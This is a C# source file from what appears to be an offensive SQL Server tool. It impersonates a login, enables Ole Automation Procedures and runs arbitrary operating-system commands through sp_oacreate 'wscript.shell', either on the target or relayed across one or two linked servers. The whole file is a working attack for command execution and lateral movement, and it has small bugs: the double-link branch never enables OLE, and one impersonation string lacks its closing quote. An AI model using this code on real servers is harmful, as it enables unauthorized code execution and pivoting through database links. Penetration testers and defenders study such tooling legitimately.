using System;
using System.Data.SqlClient;

namespace MSSharpQL.Commands
{
    internal class SPOA
    {
        public static void SPOACreateMethod(string cmd, string userToImpersonate, string sqlServer, string database, string linkedServer, string doubleLinkedServer, bool enableRPC)
        {
            string conStr = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            string output = "";
            string getCurrentUserSA = "Select SUSER_SNAME();";
            string getCurrentDBUser = "Select USER_NAME();";
            string impersonateQuery = $"EXECUTE AS LOGIN = '{userToImpersonate}';";
            string enableOLE = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            string execCMD = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";
            string impersonateLogin = $"EXECUTE AS LOGIN = '{userToImpersonate}';";
            string impersonateDbUser = $"EXECUTE AS LOGIN = '{userToImpersonate}";
            string execSingleLinkEnableOLE = $"EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT \"{linkedServer}\";";
            string execSingleLinkExecCMD = $"EXEC ('DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"{cmd}\"'';') AT \"{linkedServer}\";";
            string execDoubleLinkEnableOLE = $"EXEC ('EXEC (''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE; sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE;'') AT \"{doubleLinkedServer}\"') AT \"{linkedServer}\";";
            string execDoubleLinkExecCMD = $"EXEC ('EXEC (''DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c \"{cmd}\"'''';'') AT \"{doubleLinkedServer}\"') AT \"{linkedServer}\";";

            using (SqlConnection con = new SqlConnection(conStr))
            {
                try
                {
                    con.Open();
                    
                    Connection.DatabaseConnection.GetLoginInformation(conStr, con);

                    if (!string.IsNullOrEmpty(userToImpersonate))
                    {
                        Console.WriteLine($"[+] Attempting to impersonate {userToImpersonate}.");
                        if (userToImpersonate != "dbo")
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateLogin, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentUserSA, con);
                        }
                        else
                        {
                            Connection.DatabaseConnection.ExecuteQuery(impersonateDbUser, con);
                            output = Connection.DatabaseConnection.ExecuteQuery(getCurrentDBUser, con);
                        }
                        Console.WriteLine($"    [+] Current User: {output}");
                    }

                    if (enableRPC)
                    {
                        Connection.DatabaseConnection.enableLinkedServerRPC(linkedServer, conStr, con);
                    }

                    if (!string.IsNullOrWhiteSpace(doubleLinkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to execute commands through double linked server query: {sqlServer} => {linkedServer} => {doubleLinkedServer}");
                        
                        Console.WriteLine($"[+] Attempting to enable Ole Automation Procedures on {doubleLinkedServer}");
                        Connection.DatabaseConnection.ExecuteQuery(execDoubleLinkExecCMD, con);
                        Console.WriteLine($"[+] Executing the following command: {cmd}");
                        output = Connection.DatabaseConnection.ExecuteQuery(execDoubleLinkExecCMD, con);
                        Console.Write($"    [+] Command Executed! Output is not possible as commands are executed within a local variable.");
                       
                        Environment.Exit(0);
                    }
                    if (!string.IsNullOrEmpty(linkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to execute commands on the following linked server: {sqlServer} => {linkedServer}");
                        
                        Console.WriteLine($"[+] Attempting to enable Ole Automation Procedures on {linkedServer}");
                        Connection.DatabaseConnection.ExecuteQuery(execSingleLinkEnableOLE, con);
                        Console.WriteLine($"[+] Executing the following command: {cmd}");
                        output = Connection.DatabaseConnection.ExecuteQuery(execSingleLinkExecCMD, con);
                        Console.Write($"    [+] Command Executed! Output is not possible as commands are executed within a local variable.");
                       
                    }
                    if (string.IsNullOrEmpty(doubleLinkedServer) && string.IsNullOrEmpty(linkedServer))
                    {
                        Console.WriteLine($"[+] Attempting to enable Ole Automation Procedures on {sqlServer}");
                        Connection.DatabaseConnection.ExecuteQuery(enableOLE, con);
                        Console.WriteLine($"[+] Executing the following command: {cmd}");
                        output = Connection.DatabaseConnection.ExecuteQuery(execCMD, con);
                        Console.Write($"    [+] Command Executed! Output is not possible as commands are executed within a local variable.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }
            }
        }
    }
}
